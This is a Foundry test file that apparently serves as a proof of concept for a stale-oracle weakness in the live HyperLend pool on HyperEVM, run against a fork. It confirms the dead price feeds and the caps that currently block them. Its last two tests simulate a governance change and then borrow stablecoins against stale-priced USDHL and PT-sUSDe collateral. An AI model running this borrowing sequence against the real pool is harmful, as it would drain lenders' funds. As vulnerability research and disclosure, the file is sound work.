// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IPool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
    function setUserEMode(uint8 categoryId) external;
    function getUserEMode(address user) external view returns (uint256);
    function getUserAccountData(address user)
        external view
        returns (uint256 totalCollateralBase, uint256 totalDebtBase, uint256 availableBorrowsBase,
                 uint256 currentLiquidationThreshold, uint256 ltv, uint256 healthFactor);
    function getConfiguration(address asset) external view returns (uint256);
    function getReservesList() external view returns (address[] memory);
    function ADDRESSES_PROVIDER() external view returns (address);
}

interface IAaveOracle {
    function getAssetPrice(address asset) external view returns (uint256);
    function getSourceOfAsset(address asset) external view returns (address);
    function BASE_CURRENCY_UNIT() external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function totalSupply() external view returns (uint256);
}

interface IAggregator {
    function latestAnswer() external view returns (int256);
    function latestTimestamp() external view returns (uint256);
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
    function decimals() external view returns (uint8);
}

/// @title HyperLend core-pool oracle-staleness PoC (HyperEVM 999)
/// @notice READ-ONLY / fork-only. No mainnet tx. Fork of the live HyperEVM chain.
///   Verifies: (a) the oracle is a stock AaveOracle with no staleness check;
///   (b) two feeds are dead (USDHL 60d, PT-sUSDe 127d) yet return prices;
///   (c) both dead-feed reserves are soft-delisted (supplyCap=1 & borrowCap=1, already exceeded)
///       AND USDHL has LTV 0 -> no permissionless path today;
///   (d) the conditional trigger: give the dead feed a real LTV + an open cap -> drain succeeds.
contract HyperLendPoC is Test {
    address constant POOL   = 0x00A89d7a5A02160f20150EbEA7a2b5E4879A1A8b;
    address constant ORACLE = 0xC9Fb4fbE842d57EAc1dF3e641a281827493A630e;

    address constant USDHL   = 0xb50A96253aBDF803D85efcDce07Ad8becBc52BD5; // dead feed 60d, LTV 0, caps=1
    address constant PTSUSDE = 0xb7379d395F3c83952ad794896205f7E33E358735; // dead feed 127d, LTV 5bps, caps=1
    address constant USDC    = 0xb88339CB7199b77E23DB6E890353E22632Ba630f;
    address constant USDT0   = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;
    address constant USDE    = 0x5d3a1Ff2b6BAb83b63cd9AD0787074081a52ef34;

    address constant USDHL_FEED   = 0xa19b7fE6FFd492dd84ADF38D37B974Cb52f40267; // PythOracleAdapter(getPriceUnsafe)
    address constant PTSUSDE_FEED = 0x8514D528275025AD9bE6019e6e189DFeF1Db6c5e; // PendlePriceCapAdapter
    address constant USDC_FEED    = 0xEdC6287D3D41b322AF600317628D7E226DD3add4; // fresh live-LTV feed

    // _reserves mapping slot in the deployed PoolInstance (empirically located, WHYPE config matched)
    uint256 constant RESERVES_SLOT = 52;

    // config bit masks (Aave v3.4 ReserveConfiguration) — built with ~ to avoid literal errors
    uint256 constant M_LTV       = ~uint256(0xFFFF);
    uint256 constant M_LIQTHRESH = ~(uint256(0xFFFF) << 16);
    uint256 constant M_BORROWCAP = ~(uint256(0xFFFFFFFFF) << 80);
    uint256 constant M_SUPPLYCAP = ~(uint256(0xFFFFFFFFF) << 116);

    IPool pool = IPool(POOL);
    IAaveOracle oracle = IAaveOracle(ORACLE);
    address attacker = address(0xA11CE);

    function setUp() public {
        string memory url = vm.envOr("HYPEREVM_RPC_URL", string("https://rpc.hyperliquid.xyz/evm"));
        vm.createSelectFork(url);
        vm.label(POOL, "Pool");
        vm.label(ORACLE, "AaveOracle");
        vm.label(USDHL, "USDHL");
        vm.label(PTSUSDE, "PT-sUSDe-25SEP2025");
    }

    // ---- helpers ---------------------------------------------------------
    function cfg(address a) internal view returns (uint256) { return pool.getConfiguration(a); }
    function ltvOf(uint256 c) internal pure returns (uint256) { return c & 0xFFFF; }
    function liqThrOf(uint256 c) internal pure returns (uint256) { return (c >> 16) & 0xFFFF; }
    function borrowCapOf(uint256 c) internal pure returns (uint256) { return (c >> 80) & 0xFFFFFFFFF; }
    function supplyCapOf(uint256 c) internal pure returns (uint256) { return (c >> 116) & 0xFFFFFFFFF; }
    function setLtv(uint256 c, uint256 v) internal pure returns (uint256) { return (c & M_LTV) | v; }
    function setLiqThr(uint256 c, uint256 v) internal pure returns (uint256) { return (c & M_LIQTHRESH) | (v << 16); }
    function setBorrowCap(uint256 c, uint256 v) internal pure returns (uint256) { return (c & M_BORROWCAP) | (v << 80); }
    function setSupplyCap(uint256 c, uint256 v) internal pure returns (uint256) { return (c & M_SUPPLYCAP) | (v << 116); }
    function reserveSlot(address asset) internal pure returns (bytes32) {
        return keccak256(abi.encode(asset, RESERVES_SLOT));
    }
    function writeCfg(address asset, uint256 newCfg) internal {
        vm.store(POOL, reserveSlot(asset), bytes32(newCfg));
    }

    // ---- 1. oracle is stock: no staleness check, dead feeds still answer --
    function test_01_oracle_dead_feeds_still_answer() public {
        // feed ages (the PT PendlePriceCapAdapter exposes latestRoundData only, not latestTimestamp)
        uint256 usdhlTs = IAggregator(USDHL_FEED).latestTimestamp();
        ( , , , uint256 ptTs, ) = IAggregator(PTSUSDE_FEED).latestRoundData();
        uint256 nowTs   = block.timestamp;
        console2.log("USDHL feed age (days)", (nowTs - usdhlTs) / 1 days);
        console2.log("PT feed age (days)",    (nowTs - ptTs) / 1 days);
        console2.log("USDHL oracle price",   oracle.getAssetPrice(USDHL));
        console2.log("PT oracle price",      oracle.getAssetPrice(PTSUSDE));

        assertGt(nowTs - usdhlTs, 50 days, "USDHL feed should be >50d stale");
        assertGt(nowTs - ptTs,    120 days, "PT feed should be >120d stale");
        assertGt(oracle.getAssetPrice(USDHL),   0, "dead USDHL feed still returns a price");
        assertGt(oracle.getAssetPrice(PTSUSDE), 0, "dead PT feed still returns a price");
        // source is the Pyth adapter using getPriceUnsafe / the Pendle cap adapter
        assertEq(oracle.getSourceOfAsset(USDHL),   USDHL_FEED);
        assertEq(oracle.getSourceOfAsset(PTSUSDE), PTSUSDE_FEED);
    }

    // ---- 2. no staleness check is general: oracle returns ANY latestAnswer --
    function test_02_oracle_ignores_staleness_and_divergence() public {
        // The oracle reads only latestAnswer() and requires >0. Mock a divergent + stale answer.
        vm.mockCall(USDC_FEED, abi.encodeWithSignature("latestAnswer()"), abi.encode(int256(2_00000000))); // $2.00 "stale"
        uint256 p = oracle.getAssetPrice(USDC);
        console2.log("USDC price with mocked stale/divergent answer", p);
        assertEq(p, 2_00000000, "oracle accepted a divergent price with no staleness/heartbeat check");

        // and a <=0 answer falls through to the fallback oracle; with no fallback set it reverts
        vm.mockCall(USDC_FEED, abi.encodeWithSignature("latestAnswer()"), abi.encode(int256(0)));
        vm.expectRevert();
        oracle.getAssetPrice(USDC);
        console2.log("answer 0 -> reverts (fallback oracle unset) -- confirms price>0 is the ONLY check");
    }

    // ---- 3. USDHL is inert today: caps exceeded + LTV 0 --------------------
    function test_03_usdhl_soft_delisted_and_not_collateral() public {
        uint256 c = cfg(USDHL);
        console2.log("USDHL LTV", ltvOf(c));
        console2.log("USDHL supplyCap", supplyCapOf(c));
        console2.log("USDHL borrowCap", borrowCapOf(c));
        assertEq(ltvOf(c), 0, "USDHL LTV is 0 -> cannot be collateral");
        assertEq(supplyCapOf(c), 1, "USDHL supplyCap is 1 (whole tokens)");
        assertEq(borrowCapOf(c), 1, "USDHL borrowCap is 1 (whole tokens)");

        // current supply/borrow far exceed cap 1 -> any new supply/borrow reverts
        deal(USDHL, attacker, 1_000e6);
        vm.startPrank(attacker);
        IERC20(USDHL).approve(POOL, type(uint256).max);
        vm.expectRevert(); // SupplyCapExceeded
        pool.supply(USDHL, 100e6, attacker, 0);
        vm.stopPrank();

        // collateral enable reverts (LTV 0)
        deal(USDHL, attacker, 10e6);
        vm.startPrank(attacker);
        IERC20(USDHL).approve(POOL, type(uint256).max);
        vm.expectRevert(); // cap or LTV-zero
        pool.supply(USDHL, 10e6, attacker, 0);
        vm.stopPrank();
    }

    function test_04_usdhl_borrow_reverts_over_cap() public {
        // give the attacker USDC collateral (a live-LTV asset) then try to borrow USDHL
        deal(USDC, attacker, 100_000e6);
        vm.startPrank(attacker);
        IERC20(USDC).approve(POOL, type(uint256).max);
        pool.supply(USDC, 100_000e6, attacker, 0);
        pool.setUserUseReserveAsCollateral(USDC, true);
        vm.expectRevert(); // BorrowCapExceeded (borrowCap=1, already 3778 borrowed)
        pool.borrow(USDHL, 1e6, 2, 0, attacker);
        vm.stopPrank();
    }

    // ---- 4. PT-sUSDe e-mode collateral exists, but supply cap=1 blocks it --
    function test_05_pt_emode_collateral_but_supply_capped() public {
        uint256 c = cfg(PTSUSDE);
        console2.log("PT LTV(reserve)", ltvOf(c));
        console2.log("PT supplyCap", supplyCapOf(c));
        console2.log("PT borrowCap", borrowCapOf(c));
        assertEq(ltvOf(c), 5, "reserve LTV 5bps");
        assertEq(supplyCapOf(c), 1, "supplyCap 1");
        assertEq(borrowCapOf(c), 1, "borrowCap 1");

        // e-mode category 3 ("PT-sUSDe / stablecoins") gives the PT 75% LTV via its collateralBitmap
        vm.prank(attacker);
        pool.setUserEMode(3);
        assertEq(pool.getUserEMode(attacker), 3, "e-mode 3 set");

        // but the reserve cannot be supplied (cap=1, already 1.4511 supplied)
        deal(PTSUSDE, attacker, 100e18);
        vm.startPrank(attacker);
        IERC20(PTSUSDE).approve(POOL, type(uint256).max);
        vm.expectRevert(); // SupplyCapExceeded
        pool.supply(PTSUSDE, 10e18, attacker, 0);
        vm.stopPrank();
        console2.log("supply(PT-sUSDe) reverted: e-mode collateral path is closed by supplyCap=1");
    }

    // ---- 5. TRIGGER: dead feed gains a real LTV + open cap -> drain --------
    //  Simulates the governance action that would re-arm the finding: LTV 70%,
    //  liqThreshold 75%, open supply/borrow caps. The oracle is left untouched
    //  (still the dead $0.9978 USDHL price). An attacker supplies USDHL and
    //  borrows USDC against it up to 70% of the *stale* price.
    function test_06_trigger_dead_feed_with_real_ltv_drains() public {
        // open the USDHL reserve: LTV 70%, liqThr 75%, caps huge
        uint256 c = cfg(USDHL);
        c = setLtv(c, 7000);
        c = setLiqThr(c, 7500);
        c = setSupplyCap(c, 100_000_000);   // whole tokens
        c = setBorrowCap(c, 100_000_000);
        writeCfg(USDHL, c);
        // open USDC borrow cap so the attacker can actually borrow
        uint256 cu = cfg(USDC);
        cu = setBorrowCap(cu, 100_000_000);
        writeCfg(USDC, cu);

        uint256 stalePrice = oracle.getAssetPrice(USDHL); // 0.99779574e8 (dead feed)
        console2.log("stale USDHL oracle price", stalePrice);

        deal(USDHL, attacker, 1_000_000e6);
        vm.startPrank(attacker);
        IERC20(USDHL).approve(POOL, type(uint256).max);
        pool.supply(USDHL, 1_000_000e6, attacker, 0);
        pool.setUserUseReserveAsCollateral(USDHL, true);

        (uint256 colBase, , uint256 availBorrows, , , ) = pool.getUserAccountData(attacker);
        console2.log("collateralBase (1e8 USD) after supplying 1,000,000 USDHL", colBase);
        console2.log("availableBorrowsBase (1e8 USD)", availBorrows);

        // borrow the maximum available in USDC (6 decimals)
        uint256 toBorrow = (availBorrows / 1e2) * 1e6; // 1e8 USD -> 1e6 USDC
        if (toBorrow > 100_000e6) toBorrow = 100_000e6;
        pool.borrow(USDC, toBorrow, 2, 0, attacker);
        vm.stopPrank();

        uint256 got = IERC20(USDC).balanceOf(attacker);
        console2.log("USDC borrowed against the dead-feed collateral", got);
        assertGt(got, 0, "with a real LTV + open cap the dead-feed collateral DOES borrow");

        // economics: profit per USDHL = (stalePrice * 0.70) - realPrice
        // stalePrice = 0.9978 -> borrow power 0.6985 per USDHL.
        // Profit requires the real USDHL price to fall below ~0.698 (a ~30% depeg)
        // while the dead feed keeps reporting 0.9978.
        uint256 borrowPowerPerUnit = (stalePrice * 7000) / 10000; // 1e8
        console2.log("borrow power per USDHL (1e8)", borrowPowerPerUnit);
        console2.log("=> net profit requires real USDHL price < this value (depeg)");
    }

    // ---- 6. trigger variant: e-mode PT path with open cap -----------------
    function test_07_trigger_pt_emode_with_open_cap() public {
        uint256 c = cfg(PTSUSDE);
        c = setSupplyCap(c, 10_000_000);
        writeCfg(PTSUSDE, c);
        uint256 cu = cfg(USDT0);
        cu = setBorrowCap(cu, 100_000_000);
        writeCfg(USDT0, cu);

        vm.startPrank(attacker);
        pool.setUserEMode(3);
        deal(PTSUSDE, attacker, 100_000e18);
        IERC20(PTSUSDE).approve(POOL, type(uint256).max);
        pool.supply(PTSUSDE, 100_000e18, attacker, 0);
        pool.setUserUseReserveAsCollateral(PTSUSDE, true);
        (uint256 colBase, , uint256 availBorrows, , , ) = pool.getUserAccountData(attacker);
        console2.log("PT e-mode collateralBase (1e8)", colBase);
        console2.log("PT e-mode availableBorrows (1e8)", availBorrows);
        pool.borrow(USDT0, 50_000e6, 2, 0, attacker);
        vm.stopPrank();
        uint256 got = IERC20(USDT0).balanceOf(attacker);
        console2.log("USDT0 borrowed vs stale-priced PT collateral", got);
        assertGt(got, 0, "e-mode PT collateral borrows when the supply cap is opened");
        // 75% LTV * $0.999 = $0.749 borrow power/PT -> profit needs real PT value < 0.749
        console2.log("borrow power per PT (1e8)", (oracle.getAssetPrice(PTSUSDE) * 7500) / 10000);
    }
}
